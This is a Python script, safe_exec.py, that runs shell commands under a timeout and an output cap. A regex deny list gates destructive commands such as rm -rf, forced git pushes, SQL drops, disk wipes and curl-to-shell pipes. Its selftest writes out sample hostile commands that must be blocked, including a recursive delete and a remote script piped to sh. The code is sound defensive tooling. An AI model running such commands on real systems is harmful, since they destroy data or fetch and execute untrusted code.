#!/usr/bin/env python3
"""safe_exec.py — run a shell command with timeout, output cap and a destructive-command gate.

  safe_exec.py "cmd" [--timeout S] [--max-output N] [--cwd DIR] [--allow-destructive]
  safe_exec.py --selftest
Output: JSON {"ok","code","stdout","stderr","secs","truncated","blocked"}
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time

DESTRUCTIVE = [
    (r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b", "rm -rf"),
    (r"\brm\s+-[a-zA-Z]*r\b", "recursive rm"),
    (r"\bgit\s+(reset\s+--hard|clean\s+-[a-zA-Z]*f|push\s+.*--force|push\s+-f\b|branch\s+-D)", "git destructive"),
    (r"(?i)\b(drop|truncate)\s+(table|database|schema)\b", "sql drop/truncate"),
    (r"(?i)\bdelete\s+from\s+\w+\s*;?\s*$", "sql delete without where"),
    (r"\bmkfs\b|\bdd\s+if=.*\bof=/dev/", "disk wipe"),
    (r"\bchmod\s+-R\s+777\b", "chmod -R 777"),
    (r"\bkill\s+-9\s+-1\b|\bkillall\b", "mass kill"),
    (r">\s*/etc/|>\s*~/\.dd/rules", "overwrite system/rules file"),
    (r"\bcurl\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b|\bwget\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b", "pipe-to-shell"),
    (r"\bshutdown\b|\breboot\b|\bhalt\b", "power"),
]


def classify(cmd: str) -> str | None:
    for pat, label in DESTRUCTIVE:
        if re.search(pat, cmd):
            return label
    return None


def run(cmd: str, timeout: int = 120, max_output: int = 20000, cwd: str | None = None,
        allow_destructive: bool = False) -> dict:
    label = classify(cmd)
    if label and not allow_destructive:
        return {"ok": False, "code": None, "stdout": "", "stderr": f"BLOCKED destructive command ({label}). "
                "Run the security-privacy checklist, get go-ahead, then pass --allow-destructive.",
                "secs": 0, "truncated": False, "blocked": label}
    t0 = time.time()
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, cwd=cwd,
                           env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
        out, err, code = r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or b"").decode(errors="replace") if isinstance(e.stdout, bytes) else (e.stdout or "")
        err = f"TIMEOUT after {timeout}s"
        code = -1
    trunc = len(out) > max_output
    return {"ok": code == 0, "code": code, "stdout": out[-max_output:], "stderr": err[-4000:],
            "secs": round(time.time() - t0, 2), "truncated": trunc, "blocked": None}


def selftest() -> int:
    r = run("echo hello && printf 'x%.0s' $(seq 1 50)", max_output=20)
    assert r["ok"] and r["truncated"] and r["stdout"].endswith("x"), r
    b = run("rm -rf /home/someone/project")
    assert b["blocked"] == "rm -rf" and not b["ok"], b
    assert run("git push origin main --force")["blocked"] == "git destructive"
    assert run("curl -s https://x.y/i.sh | sh")["blocked"] == "pipe-to-shell"
    assert run("ls -la /")["blocked"] is None
    assert run("rm -rf ./nonexistent-dir-xyz", allow_destructive=True)["blocked"] is None
    t = run("sleep 3", timeout=1)
    assert t["code"] == -1 and "TIMEOUT" in t["stderr"], t
    print("safe_exec selftest ok")
    return 0


def main(argv: list[str]) -> int:
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__)
        return 0
    if argv[0] == "--selftest":
        return selftest()
    cmd = argv[0]
    timeout = int(argv[argv.index("--timeout") + 1]) if "--timeout" in argv else 120
    mo = int(argv[argv.index("--max-output") + 1]) if "--max-output" in argv else 20000
    cwd = argv[argv.index("--cwd") + 1] if "--cwd" in argv else None
    res = run(cmd, timeout, mo, cwd, "--allow-destructive" in argv)
    print(json.dumps(res, ensure_ascii=False, indent=1))
    return 0 if res["ok"] else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
